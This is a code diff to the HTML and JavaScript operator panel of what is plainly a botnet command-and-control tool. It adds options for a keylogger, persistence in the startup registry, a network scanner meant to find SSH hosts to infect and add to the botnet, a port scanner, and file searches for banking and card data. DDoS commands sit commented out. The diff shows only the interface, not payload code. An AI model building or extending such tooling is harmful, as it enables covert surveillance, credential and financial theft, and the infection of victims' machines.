@@ -36,7 +36,7 @@
                 <!-- System ID Input -->
                 <div class="centerrr">
                     <div class="select-commands-group"> 
-                        <input type="text" name="idNumber" id="idNumber" required>
+                        <input type="text" name="idNumber" id="idNumber" novalidate>
                         <span class="highlight"></span>
                         <span class="bar"></span>
                         <label style="text-indent: 5px;">System ID</label>
@@ -50,20 +50,26 @@
                             <option value="" >Select Command </option>
                             
                             <!-- Options -->
-                            <option value="admincheck">Admin Check</option>
                             <option value="clear">Clear Output</option>
+                            <option value="listbots">List Bots</option>
+                            <option value="admincheck">Admin Check</option>
                             <option value="jigglecursor">Jiggle Cursor</option>
                             <option value="jigglecursorstop">Stop Jiggle Cursor</option>
                             <option value="systeminfo">Grab System Info</option>
                             <option value="stress">Stress CPU</option>
+                            <!-- 
                             <option value="ddos">DDos Website</option>
-                            <option value="attack">DDos IP</option>
-                            <option value="keylogger">Keylogger</option>
+                            <option value="portscan">Port Scanner</option>
                             <option value="runscript">Run Script</option>
+                            <option value="attack">DDos IP</option> 
+                            -->
+                            <option value="keylogger">Keylogger</option>
                             <option value="download">Download File</option>
                             <option value="scanfiles">Scan Files</option>
                             <option value="processcontrol">Process Control</option>
                             <option value="stopprocessscontrol">Stop Process Control</option>
+                            <option value="persistance">Persistance</option>
+                            <option value="networkscan">Network Scanner</option>
                         </select>
 
                         <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
@@ -112,10 +118,25 @@
                         <h3>Disable process control for client</h3>
                     </div>
 
+                    <!-- Network Scanner -->
+                    <div class="desc-box" id="desc-networkscan" style="display: none;">
+                        <h3>Scan clients local network for any systems with port 22 open<br>(so they can be infected and added to the botnet)</h3>
+                    </div>
+
+                    <!-- Port Scanner -->
+                    <div class="desc-box" id="desc-portscan" style="display: none;">
+                        <h3>Scan clients local network for any open ports</h3>
+                    </div>
+
+                    <!-- List Bots -->
+                    <div class="desc-box" id="desc-listbots" style="display: none;">
+                        <h3>Show total amount of connected bots</h3>
+                    </div>
+
                     
                     <!-- Process Control -->
                     <div class="desc-box" id="desc-input-processcontrol" style="display: none;">
-                        <h3>Kill any running processes you have blocked when they are ran</h3>
+                        <h3>Kill any running processes you have blocked when they are ran<br><br>seperate names with spaces: notepad steam</h3>
                     </div>
 
                     <!-- Stress -->
@@ -135,7 +156,7 @@
 
                     <!-- Keylogger -->
                     <div class="desc-box" id="desc-input-needed-keylogger" style="display: none;">
-                        <h3>Infect client with a keystroke logger</h3> 
+                        <h3>Infect client with a keystroke logger<br><br>Intervals (hours)</h3> 
                     </div>
 
                     <!-- Run Script -->
@@ -150,7 +171,17 @@
 
                     <!-- Scan PC Files -->
                     <div class="desc-box" id="desc-input-needed-scanfiles" style="display: none;">
-                        <h3>Scan C drive for any files named with your input (seperate filenames with a space)</h3> 
+                        <h3>Scan C drive for any files named with your input <br><br>seperate filenames with a space: banking cash cards private_infomation</h3> 
+                    </div>
+
+                    <!-- Persistance -->
+                    <div class="desc-box" id="desc-input-needed-persistance" style="display: none;">
+                        <h3>Set persistance to the client (add to startup)</h3> 
+                    </div>
+
+                    <!-- Port Scanner -->
+                    <div class="desc-box" id="desc-input-needed-portscan" style="display: none;">
+                        <h3>Scan clients local network for open ports between the 2 selected ports</h3> 
                     </div>
                 </div>
 
@@ -332,6 +363,40 @@
                             <label>Processes To Block</label>
                         </div> 
                     </div>
+
+                    <!-- Persistance -->
+                    <div id="input-needed-persistance" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="persistance-name" id="persistance-name" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Persistance Registry Name</label>
+                        </div> 
+                    </div>
+
+                    <!-- Port Scanner -->
+                    <div id="input-needed-portscan" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="portscan-starting-port" id="portscan-starting-port" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Starting Port</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="portscan-ending-port" id="portscan-ending-port" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Ending Port</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="portscan-threads" id="portscan-threads" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Threads</label>
+                        </div> 
+                    </div>
                 </div>
 
             </form>
@@ -511,6 +576,20 @@ function commandCheck(command) {
         document.getElementById("desc-systeminfo").style.display = "none";
     }
 
+    /* Network Scan */
+    if (command.value == "networkscan") {
+        document.getElementById("desc-networkscan").style.display = "block";
+    } else {
+        document.getElementById("desc-networkscan").style.display = "none";
+    }
+
+    /* List Bots */
+    if (command.value == "listbots") {
+        document.getElementById("desc-listbots").style.display = "block";
+    } else {
+        document.getElementById("desc-listbots").style.display = "none";
+    }
+
 
     /* Process Control */
     if (command.value == "processcontrol") {
@@ -583,6 +662,24 @@ function commandCheck(command) {
     } else {
         document.getElementById("input-needed-scanfiles").style.display = "none";
         document.getElementById("desc-input-needed-scanfiles").style.display = "none";
+    }
+
+    /* Persistance */
+    if (command.value == "persistance") {
+        document.getElementById("input-needed-persistance").style.display = "block";
+        document.getElementById("desc-input-needed-persistance").style.display = "block";
+    } else {
+        document.getElementById("input-needed-persistance").style.display = "none";
+        document.getElementById("desc-input-needed-persistance").style.display = "none";
+    }
+
+    /* Port Scanner */
+    if (command.value == "portscan") {
+        document.getElementById("input-needed-portscan").style.display = "block";
+        document.getElementById("desc-input-needed-portscan").style.display = "block";
+    } else {
+        document.getElementById("input-needed-portscan").style.display = "none";
+        document.getElementById("desc-input-needed-portscan").style.display = "none";
     }
 }
 </script>
